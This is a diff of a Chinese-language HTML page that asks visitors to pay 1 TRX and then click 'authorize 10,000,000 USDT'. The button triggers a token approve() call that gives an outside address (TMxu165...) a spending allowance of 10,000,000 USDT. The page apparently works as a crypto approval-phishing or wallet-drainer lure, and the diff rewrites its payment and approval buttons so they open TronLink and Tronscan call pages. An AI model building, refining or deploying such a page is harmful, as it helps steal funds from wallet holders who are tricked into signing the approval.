@@ -22,16 +22,18 @@
 </head>
 <body>
   <h1>請支付 1 TRX 開始授權</h1>
-  <p>掃描下方 QR Code 或點擊付款，支付後系統將引導你授權 10,000,000 USDT。</p>
+  <p>請用 TronLink 的 DApp 瀏覽器開啟本頁，掃描 QR Code 或點擊付款，完成後請點授權。</p>
 
-  <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=tron:THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR" alt="QR Code"><br>
-  <a class="button" href="tron:THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR">點我付款 1 TRX</a>
+  <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TRX%20Payment%3A%20THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR" alt="QR Code"><br>
+  <button class="button" onclick="window.open('https://tron.network/#/send?to=THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR&asset=trx&amount=1', '_blank')">
+    點我付款 1 TRX
+  </button>
 
   <div class="tip">
     支付完成後請點擊下方按鈕完成授權 👇
   </div>
-  <a class="button" style="background:#00b894; margin-top:1em;" href="tron:TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj?function_selector=approve(address,uint256)&parameter=000000000000000000000000TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa000000000000000000000000000000000000000000000000000009184e72a000">
+  <button class="button" style="background:#00b894; margin-top:1em;" onclick="window.open('https://tronscan.org/#/contract/TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj/call?method=approve(address,uint256)&value=0&parameter=000000000000000000000000TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa000000000000000000000000000000000000000000000000000009184e72a000', '_blank')">
     授權 10,000,000 USDT
-  </a>
+  </button>
 </body>
 </html>
